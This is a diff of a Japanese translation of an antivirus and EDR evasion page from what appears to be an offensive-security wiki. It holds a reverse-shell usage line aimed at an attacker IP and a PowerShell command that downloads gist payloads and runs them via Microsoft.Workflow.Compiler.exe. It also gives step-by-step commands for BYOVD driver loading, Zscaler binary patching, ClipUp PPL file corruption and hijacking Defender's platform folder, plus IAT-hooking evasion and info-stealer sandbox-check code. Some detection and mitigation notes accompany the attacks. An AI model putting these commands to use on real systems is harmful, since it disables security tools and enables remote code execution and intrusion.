 #### 最初の C# Revershell
 
-次のようにコンパイルします:
+次のコマンドでコンパイルする:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-以下のように使用します:
+これを使用するには:
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -666,14 +694,11 @@ catch (Exception err) { }
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
-そのファイルの中身をこちらに貼っていただけますか？外部リンクやリポジトリから自動で取得することはできません。
+[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
 
-翻訳のルール（確認のため）
-- コード、コマンド、パス、リンク、タグ（例: {#tabs} や markdown/html タグ）は翻訳しません。
-- 技術名（ハッキング手法、クラウド名、pentesting など）も翻訳しません。
-- それ以外の英語テキストを日本語に翻訳して、元の markdown/html 構造はそのまま保持します。
+[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
 
-ファイル内容を貼っていただければ、指示どおりに翻訳して返します。
+自動ダウンロードと実行:
 ```csharp
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
@@ -685,7 +710,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
 {{#endref}}
 
-C# obfuscators の一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+C# の難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
 ```
@@ -700,7 +725,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Pythonを使用したビルドインジェクターの例:
+### python を使用した build injectors の例:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -733,18 +758,18 @@ https://github.com/praetorian-code/vulcan
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
-## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR 無効化
+## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からのAV/EDRの無効化
 
-Storm-2603 は小さなコンソールユーティリティである **Antivirus Terminator** を利用して、ランサムウェアを展開する前にエンドポイント保護を無効化しました。このツールは **独自の脆弱だが *signed* なドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) な AV サービスでさえ阻止できない特権カーネル操作を実行します。
+Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するために **Antivirus Terminator** という小さなコンソールユーティリティを利用しました。このツールは **独自の脆弱だが*署名済み*のドライバー** を持ち込み、それを悪用して Protected-Process-Light (PPL) の AV サービスでさえブロックできない特権付きカーネル操作を実行します。
 
-主なポイント
-1. **Signed driver**: ディスクに配置されるファイル名は `ServiceMouse.sys` ですが、実体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
+Key take-aways
+1. **Signed driver**: ディスクに配置されるファイル名は `ServiceMouse.sys` ですが、バイナリ自体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正規署名済みドライバー `AToolsKrnl64.sys` です。ドライバーが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
 2. **Service installation**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
 sc start  ServiceMouse
 ```
-1 行目はドライバを **kernel service** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` がユーザーランドからアクセス可能になるようにします。
+最初の行はドライバーを **カーネルサービス** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` をユーザランドからアクセス可能にします。
 3. **IOCTLs exposed by the driver**
 | IOCTL code | Capability                              |
 |-----------:|-----------------------------------------|
@@ -764,21 +789,21 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Why it works**:  BYOVD はユーザーモードの保護を完全に回避します。カーネルで実行されるコードは *protected* なプロセスを開いて終了させたり、PPL/PP、ELAM、その他の強化機能に関係なくカーネルオブジェクトを改変できます。
+4. **Why it works**: BYOVD はユーザモードの保護を完全に回避します。カーネルで実行されるコードは *保護された* プロセスを開いたり、終了させたり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改ざんしたりできます。
 
 Detection / Mitigation
-•  Microsoft の vulnerable-driver ブロックリスト（`HVCI`, `Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
-•  新しい *kernel* サービスの作成を監視し、ワールドライト可能なディレクトリからロードされたドライバや許可リストにないドライバがロードされた場合にアラートを上げる。  
-•  カスタムデバイスオブジェクトへのユーザーモードハンドル作成の後に疑わしい `DeviceIoControl` 呼び出しが行われていないか監視する。
+•  Microsoft の脆弱なドライバーをブロックするリスト（`HVCI`, `Smart App Control`）を有効にして、`AToolsKrnl64.sys` のロードを拒否する。  
+•  新しい *カーネル* サービスの作成を監視し、ドライバーがワールドライト可能なディレクトリからロードされた場合や許可リストにない場合はアラートを上げる。  
+•  カスタムデバイスオブジェクトへのユーザモードハンドルの作成と、それに続く疑わしい `DeviceIoControl` 呼び出しを監視する。
 
 ### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
 
-Zscaler の **Client Connector** はデバイスの posture ルールをローカルで適用し、結果を他コンポーネントに伝えるために Windows RPC を利用します。設計上の弱点が二つあり、完全なバイパスを可能にします：
+Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、その結果を他のコンポーネントと通信するために Windows RPC を利用します。以下の二つの設計上の弱点により完全なバイパスが可能になります:
 
-1. Posture の評価が **完全にクライアント側で行われる**（サーバには boolean が送られるだけ）。  
-2. 内部 RPC エンドポイントは接続する実行ファイルが **Zscaler によって署名されている** ことだけを検証する（`WinVerifyTrust` 経由）。
+1. Posture 評価は **完全にクライアント側で行われる**（サーバーにはブール値が送られる）。  
+2. 内部 RPC エンドポイントは接続してくる実行ファイルが **Zscaler によって署名されているか**（`WinVerifyTrust` 経由）だけを検証する。
 
-ディスク上の署名済みバイナリを四つパッチすることで、両方の仕組みを無効化できます：
+ディスク上の署名済みバイナリ4つをパッチすることで、両方のメカニズムを無効化できます:
 
 | Binary | Original logic patched | Result |
 |--------|------------------------|---------|
@@ -803,20 +828,20 @@ f.write(replacement)
 ```
 元のファイルを置き換え、サービススタックを再起動した後:
 
-* **All** posture checks は **green/compliant** になります。
-* 署名されていない、または改変されたバイナリが named-pipe RPC endpoints を開くことができる（例：`\\RPC Control\\ZSATrayManager_talk_to_me`）。
-* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークに対して無制限のアクセスを得る。
+* **All** posture checks は **green/compliant** と表示される。
+* 署名されていない、または変更されたバイナリでも named-pipe RPC endpoints を開ける（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
+* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークへの無制限のアクセスを得る。
 
-このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが、わずかなバイトパッチで破られることを示しています。
+このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが、わずかなバイトパッチでどのように破れるかを示す。
 
-## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改竄する
+## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改ざんする
 
-Protected Process Light (PPL) は、署名者/レベルの階層を強制し、同等かそれ以上の保護レベルを持つプロセスのみが互いに改竄できるようにします。攻撃的には、正当に PPL 対応バイナリを起動し引数を制御できる場合、ログ記録などの無害な機能を AV/EDR が使用する保護ディレクトリに対する制約付きの、PPL によって裏付けられた書き込みプリミティブに変換できます。
+Protected Process Light (PPL) は署名者/レベルの階層を強制し、同等以上の保護されたプロセスのみがお互いを改ざんできるようにする。攻撃的には、正当に PPL 対応バイナリを起動し、その引数を制御できれば、無害な機能（例: ロギング）を AV/EDR が使用する保護されたディレクトリに対する制約付きの、PPL 裏付けの書き込みプリミティブに変換できる。
 
-プロセスが PPL として実行される条件
-- 対象の EXE（およびロードされる DLL）は PPL 対応の EKU で署名されている必要がある。
-- プロセスは CreateProcess で以下のフラグを使用して作成される必要がある：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
-- バイナリの署名者に一致する互換性のある保護レベルを要求する必要がある（例：アンチマルウェア署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。不適切なレベルだと作成時に失敗する。
+What makes a process run as PPL
+- ターゲットの EXE（およびロードされる DLL）は PPL 対応の EKU で署名されている必要がある。
+- プロセスは CreateProcess で次のフラグを使って作成される必要がある: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
+- バイナリの署名者と一致する互換性のある保護レベルを要求する必要がある（例: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` はアンチマルウェア署名者用、`PROTECTION_LEVEL_WINDOWS` は Windows 署名者用）。不適切なレベルだと作成時に失敗する。
 
 See also a broader intro to PP/PPL and LSASS protection here:
 
@@ -824,10 +849,10 @@ See also a broader intro to PP/PPL and LSASS protection here:
 stealing-credentials/credentials-protections.md
 {{#endref}}
 
-ランチャーツール
-- オープンソース ヘルパー: CreateProcessAsPPL (保護レベルを選択し、引数をターゲット EXE に転送する)：
+Launcher tooling
+- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数をターゲット EXE に転送する）:
 - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
-- 使用パターン：
+- 使用パターン:
 ```text
 CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
 # example: spawn a Windows-signed component at PPL level 1 (Windows)
@@ -836,76 +861,76 @@ CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
 CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
 ```
 LOLBIN プリミティブ: ClipUp.exe
-- 署名されたシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け付けます。
-- PPL プロセスとして起動されると、ファイル書き込みは PPL によって保護された状態で行われます。
-- ClipUp は空白を含むパスを解析できません。通常保護された場所を指すには 8.3 短縮パスを使用してください。
+- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むためのパラメータを受け取ります。
+- PPL プロセスとして起動すると、ファイル書き込みは PPL 保護の下で行われます。
+- ClipUp はスペースを含むパスを解析できないため、通常保護されている場所を指定する際は 8.3 short paths を使用してください。
 
-8.3 短縮パスのヘルパー
-- 短縮名を一覧表示: 各親ディレクトリで `dir /x`
+8.3 short path helpers
+- 短い名前を一覧表示: `dir /x` を各親ディレクトリで実行。
 - cmd で短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
 
-Abuse chain（概要）
-1) PPL 対応の LOLBIN (ClipUp) を、ランチャー（例: CreateProcessAsPPL）を使って `CREATE_PROTECTED_PROCESS` で起動する。
-2) ClipUp のログパス引数を渡して、保護された AV ディレクトリ（例: Defender Platform）にファイル作成を強制する。必要なら 8.3 短縮名を使う。
-3) 対象バイナリが通常 AV によって実行中にオープン/ロックされている場合（例: MsMpEng.exe）、AV 起動前のブート時に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールする。ブート順序は Process Monitor（boot logging）で検証する。
-4) 再起動時に PPL による書き込みが AV がバイナリをロックする前に行われ、ターゲットファイルが破損して起動不能になる。
+Abuse chain (abstract)
+1) ランチャー（例: CreateProcessAsPPL）を使って `CREATE_PROTECTED_PROCESS` で PPL 対応の LOLBIN (ClipUp) を起動します。
+2) ClipUp のログパス引数を渡して、保護された AV ディレクトリ（例: Defender Platform）にファイル作成を強制します。必要であれば 8.3 short names を使用してください。
+3) ターゲットバイナリが通常 AV によって実行中に開かれて/ロックされている場合（例: MsMpEng.exe）、AV が起動する前のブート時に書き込みを行うよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールします。ブート順序は Process Monitor（boot logging）で検証してください。
+4) 再起動時、PPL 保護での書き込みが AV がバイナリをロックする前に行われ、ターゲットファイルを破損させて起動を妨げます。
 
 Example invocation (paths redacted/shortened for safety):
 ```text
 # Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
 CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
 ```
-Notes and constraints
-- ClipUp が書き込む内容は配置以外で制御できません。これは精密なコンテンツ注入よりも破損を目的としたプリミティブです。
-- サービスのインストール/開始と再起動の機会にはローカル管理者権限/SYSTEM が必要です。
-- タイミングが重要：対象が開かれていない必要があり、ブート時の実行はファイルロックを回避します。
+注意事項と制約
+- ClipUp が書き込む内容は配置以外では制御できない；このプリミティブは精密なコンテンツ注入よりも破損に適している。
+- サービスをインストール/開始するためのローカル Administrator/SYSTEM 権限と再起動の時間枠が必要。
+- タイミングが重要：対象が開かれていない必要がある。ブート時実行はファイルロックを回避する。
 
-Detections
-- ブート前後に、非標準のランチャーを親に持ち、異常な引数で `ClipUp.exe` がプロセス生成されること。
-- 疑わしいバイナリを自動起動するよう設定された新規サービス、かつ Defender/AV より前に常に起動するサービス。Defender の起動失敗の前にサービスの作成/変更を調査すること。
-- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視。protected-process フラグを持つプロセスによる予期しないファイル作成/変更を確認する。
-- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` で生成されたプロセスや、非 AV バイナリによる異常な PPL レベルの使用を監視する。
+検出
+- 異常な引数で起動された `ClipUp.exe` のプロセス生成、特に非標準のランチャーを親にしている場合やブート周辺での発生。
+- 自動起動に設定された疑わしいバイナリを指す新規サービスや、Defender/AV より先に一貫して起動するサービス。Defender の起動失敗前のサービス作成/変更を調査する。
+- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視；protected-process フラグを持つプロセスによる予期せぬファイル作成/変更を確認する。
+- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非-AV バイナリによる異常な PPL レベルの使用を探す。
 
-Mitigations
-- WDAC/Code Integrity: どの署名済みバイナリが PPL として、またどの親プロセス下で実行できるかを制限する。正当なコンテキスト外での ClipUp の呼び出しをブロックする。
-- サービスの管理: 自動起動サービスの作成/変更を制限し、起動順序の操作を監視する。
-- Defender の改ざん防止と早期起動保護を有効にすること。バイナリの破損を示す起動エラーを調査する。
-- セキュリティツールをホストするボリュームで 8.3 ショートネーム生成を無効化することを検討（環境と互換性がある場合、十分にテストすること）。
+対策
+- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセスの下で実行できるかを制限する。正当なコンテキスト外での ClipUp 呼び出しをブロックする。
+- サービス管理：自動起動サービスの作成/変更を制限し、起動順序の改ざんを監視する。
+- Defender の tamper protection と early-launch protections を有効にする；バイナリ破損を示す起動エラーを調査する。
+- 環境と互換性がある場合は、セキュリティツールを配置するボリュームで 8.3 ショートネーム生成を無効化することを検討する（十分にテストすること）。
 
-References for PPL and tooling
+PPL とツールの参照
 - Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
 - EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
 - Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
 - CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 - Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
 
-## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack
+## Platform Version Folder Symlink Hijack による Microsoft Defender の改ざん
 
-Windows Defender chooses the platform it runs from by enumerating subfolders under:
+Windows Defender は、以下の下位フォルダーを列挙して実行するプラットフォームを選択する：
 - `C:\ProgramData\Microsoft\Windows Defender\Platform\`
 
-It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.
+最も辞書順で大きいバージョン文字列（例：`4.18.25070.5-0`）を持つサブフォルダーを選び、そこから Defender サービスプロセスを起動する（サービス/レジストリのパスを更新する）。この選択はディレクトリエントリ（directory reparse points (symlinks) を含む）を信頼する。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービスの停止を引き起こすことができる。
 
-Preconditions
-- ローカル管理者（Platform フォルダ下でディレクトリ/シンボリックリンクを作成するために必要）
-- 再起動または Defender プラットフォームの再選択をトリガーできること（ブート時のサービス再起動）
-- ビルトインのツールのみ必要（mklink）
+前提条件
+- ローカル Administrator（Platform フォルダー下にディレクトリ/シンボリックリンクを作成するために必要）
+- 再起動または Defender のプラットフォーム再選択をトリガーできる能力（ブート時のサービス再起動）
+- 組み込みツールのみで可能（mklink）
 
-Why it works
-- Defender は自身のフォルダへの書き込みをブロックしますが、プラットフォーム選択はディレクトリエントリを信用し、ターゲットが保護/信頼されたパスに解決されるかを検証せずに辞書順で最も大きいバージョンを選びます。
+仕組み
+- Defender は自身のフォルダーへの書き込みをブロックするが、プラットフォーム選択はディレクトリエントリを信頼し、対象が保護/信頼済みのパスに解決されるかを検証せずに辞書順で最大のバージョンを選択する。
 
-Step-by-step (example)
-1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
+手順（例）
+1) 現在の platform フォルダーの書き込み可能なクローンを準備する。例：`C:\TMP\AV`:
 ```cmd
 set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
 set DST="C:\TMP\AV"
 robocopy %SRC% %DST% /MIR
 ```
-2) Platform 内に、あなたのフォルダを指す上位バージョンのディレクトリへのシンボリックリンクを作成する:
+2) Platform 内に、あなたのフォルダを指す上位バージョンのディレクトリ symlink を作成する:
 ```cmd
 mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
 ```
-3) トリガーの選択（再起動を推奨）:
+3) トリガー選択（再起動推奨）:
 ```cmd
 shutdown /r /t 0
 ```
@@ -915,33 +940,33 @@ Get-Process MsMpEng | Select-Object Id,Path
 # or
 wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
 ```
-新しいプロセスパスが `C:\TMP\AV\` に存在し、サービス設定/レジストリがその場所を反映していることを確認してください。
+You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.
 
 Post-exploitation options
-- DLL sideloading/code execution: Defender がアプリケーションディレクトリからロードする DLL を Drop/replace して、Defender のプロセス内で code を実行します。詳細は上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
-- Service kill/denial: version-symlink を削除すると、次回起動時に設定されたパスが解決されず、Defender が起動に失敗します:
+- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLLs を配置・置換して Defender のプロセス内でコードを実行する。詳細は上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
+- Service kill/denial: version-symlink を削除すると、次回起動時に設定されたパスが解決されず Defender が起動に失敗します:
 ```cmd
 rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
 ```
 > [!TIP]
-> この手法自体では権限昇格を提供しないことに注意してください。管理者権限が必要です。
+> この手法自体は権限昇格を提供しません。管理者権限が必要です。
 
 ## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)
 
-Red teamsは、Import Address Table (IAT) をフックし、選択したAPIsを攻撃者が制御する position‑independent code (PIC) 経由でルーティングすることで、ランタイム回避をC2 implantの外からターゲットモジュール自身の内部へ移すことができます。これにより、多くのキットが露呈する小さなAPIサーフェス（例: CreateProcessA）を超えて回避策が一般化され、同じ保護がBOFsやpost‑exploitation DLLsにも拡張されます。
+Red teamは、C2 implantのランタイム回避を標的モジュール自体に移し、Import Address Table (IAT)をフックして、選択したAPIを攻撃者管理のposition‑independent code (PIC)経由にルーティングすることでこれを行えます。これにより、多くのキットが露出する小さなAPI表面（例: CreateProcessA）を超えて回避が一般化され、同じ保護をBOFsやpost‑exploitation DLLsにも拡張します。
 
 High-level approach
-- reflective loader（prepended または companion）を使って、ターゲットモジュールの横にPIC blobをステージします。PICは自己完結型でposition‑independentでなければなりません。
-- ホストDLLがロードされる際に、その IMAGE_IMPORT_DESCRIPTOR を走査して、対象のインポート（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）のIATエントリを薄いPICラッパーを指すようにパッチします。
-- 各PICラッパーは実際のAPIアドレスにtail‑callingする前に回避処理を実行します。典型的な回避手法には次のようなものがあります:
-  - 呼び出しの前後でメモリをマスク/アンマスクする（例: beacon regions を暗号化、RWX→RX、ページ名/権限の変更）そして呼び出し後に復元する。
-  - Call‑stack spoofing: 悪意のないスタックを構築してターゲットAPIに移行し、call‑stack 分析が期待されるフレームに解決されるようにする。
-  - 互換性のためにインターフェースをエクスポートし、Aggressor script（または同等のもの）が Beacon、BOFs、post‑ex DLLs に対してどのAPIをフックするかを登録できるようにします。
+- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
+- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
+- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
+- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
+- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
+- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.
 
 Why IAT hooking here
-- フックされたインポートを使用する任意のコードに対して機能し、ツールのコードを修正したり Beacon に特定のAPIをプロキシさせたりする必要がありません。
-- post‑ex DLLs をカバーします: LoadLibrary* をフックすることでモジュールロード（例: System.Management.Automation.dll, clr.dll）を傍受し、それらのAPI呼び出しに対して同じマスキング/スタック回避を適用できます。
-- CreateProcessA/W をラップすることで、call‑stack–ベースの検知に対して process‑spawning な post‑ex コマンドの信頼できる利用を回復します。
+- フックされたインポートを使用する任意のコードで動作し、ツールのコードを変更したりBeaconに特定APIのプロキシを頼ったりする必要がない。
+- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
+- CreateProcessA/Wをラップすることで、call‑stack–based検知に対してプロセス生成を行うpost‑exコマンドを確実に利用できるようにする。
 
 Minimal IAT hook sketch (x64 C/C++ pseudocode)
 ```c
@@ -951,38 +976,38 @@ Minimal IAT hook sketch (x64 C/C++ pseudocode)
 //       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
 // Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
 ```
-Notes
-- パッチは relocations/ASLR の適用後、インポートを最初に使用する前に適用すること。TitanLdr/AceLdr のような Reflective loaders は、ロードされたモジュールの DllMain 内でフックを行うことを示す。
-- ラッパーは小さく PIC-safe に保つ；真の API はパッチ適用前に取得した元の IAT 値から解決するか、LdrGetProcedureAddress を使って解決する。
-- PIC では RW → RX の遷移を使用し、writable+executable なページを残さないようにする。
+注意
+- パッチは relocations/ASLR の後、インポートを最初に使用する前に適用する。TitanLdr/AceLdr のような reflective loaders は、読み込まれたモジュールの DllMain 中にフックを行う例を示す。
+- ラッパーは小さく PIC-safe に保つ。真の API は、パッチ適用前に取得した元の IAT 値か LdrGetProcedureAddress 経由で解決する。
+- PIC には RW → RX の遷移を使い、writable+executable ページを残さないこと。
 
-Call‑stack spoofing stub
-- Draugr‑style PIC スタブは偽のコールチェーン（良性モジュールへの戻りアドレス）を構築し、そこから実際の API へピボットする。
-- これは Beacon/BOFs から敏感な API への標準的なスタックを期待する検出を回避する。
-- API のプロローグ前に期待されるフレーム内に着地するため、stack cutting/stack stitching 技術と組み合わせて使用する。
+コールスタック偽装スタブ
+- Draugr‑style PIC stubs は偽のコールチェーン（正当なモジュール内へのリターンアドレス）を構築し、その後実際の API にピボットする。
+- これにより、Beacon/BOFs から敏感な API への正規のスタックを期待する検出を回避できる。
+- stack cutting/stack stitching 技術と組み合わせて、API のプロローグ前に期待されるフレーム内に着地させる。
 
-Operational integration
-- post‑ex DLL に reflective loader を先頭に付けることで、DLL がロードされた際に PIC とフックが自動的に初期化されるようにする。
-- Aggressor スクリプトを使用してターゲット API を登録し、Beacon と BOFs がコード変更なしに同じ回避パスの恩恵を透過的に受けられるようにする。
+運用統合
+- post‑ex DLLs の先頭に reflective loader を付けることで、DLL がロードされた際に PIC とフックが自動的に初期化されるようにする。
+- Aggressor スクリプトを使ってターゲット API を登録し、Beacon と BOFs がコード変更なしに同じ evasion path を透過的に利用できるようにする。
 
-Detection/DFIR considerations
-- IAT 整合性: 非イメージ（heap/anon）アドレスに解決されるエントリ；インポートポインタの定期的検証。
-- スタック異常: ロードされたイメージに属さない戻りアドレス；非イメージ PIC への急な遷移；一貫性のない RtlUserThreadStart の系譜。
-- ローダーのテレメトリ: プロセス内での IAT への書き込み、インポートサムを変更する早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
-- イメージロード回避: LoadLibrary* をフックしている場合、memory masking イベントと相関する automation/clr アセンブリの不審なロードを監視する。
+検出/DFIR の考慮事項
+- IAT integrity: non‑image（heap/anon）アドレスに解決されるエントリ；インポートポインタの定期的な検証。
+- Stack anomalies: ロードされたイメージに属さないリターンアドレス；非イメージ PIC への急激な遷移；一貫性のない RtlUserThreadStart の祖先関係。
+- Loader telemetry: プロセス内での IAT 書き込み、import thunk を変更するような早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
+- Image‑load evasion: LoadLibrary* をフックしている場合、memory masking イベントと相関する automation/clr assemblies の怪しいロードを監視する。
 
-Related building blocks and examples
-- ロード中に IAT パッチを行う Reflective loaders（例: TitanLdr, AceLdr）
-- Memory masking hooks（例: simplehook）および stack‑cutting PIC（stackcutting）
-- PIC コールスタック偽装スタブ（例: Draugr）
+関連する構成要素と例
+- ロード中に IAT パッチを行う reflective loaders (例: TitanLdr, AceLdr)
+- Memory masking hooks (例: simplehook) と stack‑cutting PIC (stackcutting)
+- PIC call‑stack spoofing stubs (例: Draugr)
 
-## SantaStealer Tradecraft for Fileless Evasion and Credential Theft
+## SantaStealer のファイルレス回避と認証情報窃取のトレードクラフト
 
-SantaStealer（aka BluelineStealer）は、現代の info-stealers が AV bypass、anti-analysis、credential access を単一のワークフローでどのように組み合わせるかを示している。
+SantaStealer (aka BluelineStealer) は、現代の info-stealers が AV bypass、anti-analysis、credential access を単一のワークフローでどのように組み合わせるかを示している。
 
-### Keyboard layout gating & sandbox delay
+### キーボードレイアウトによるゲーティングとサンドボックス遅延
 
-- 設定フラグ（`anti_cis`）は `GetKeyboardLayoutList` を使ってインストールされたキーボードレイアウトを列挙する。キリル文字レイアウトが見つかった場合、サンプルは空の `CIS` マーカーをドロップしてスティーラーを実行する前に終了し、除外されたロケールで決して起動しないようにしつつ、ハンティング用のアーティファクトを残す。
+- 設定フラグ (`anti_cis`) は `GetKeyboardLayoutList` を使ってインストールされたキーボードレイアウトを列挙する。キリル文字レイアウトが見つかった場合、サンプルは空の `CIS` マーカーを残して終了し、stealers の実行前に停止することで、除外されたロケールで起爆せずにハンティング用の痕跡を残す。
 ```c
 HKL layouts[64];
 int count = GetKeyboardLayoutList(64, layouts);
@@ -995,24 +1020,24 @@ ExitProcess(0);
 }
 Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
 ```
-### レイヤー化された `check_antivm` ロジック
+### 多層の `check_antivm` ロジック
 
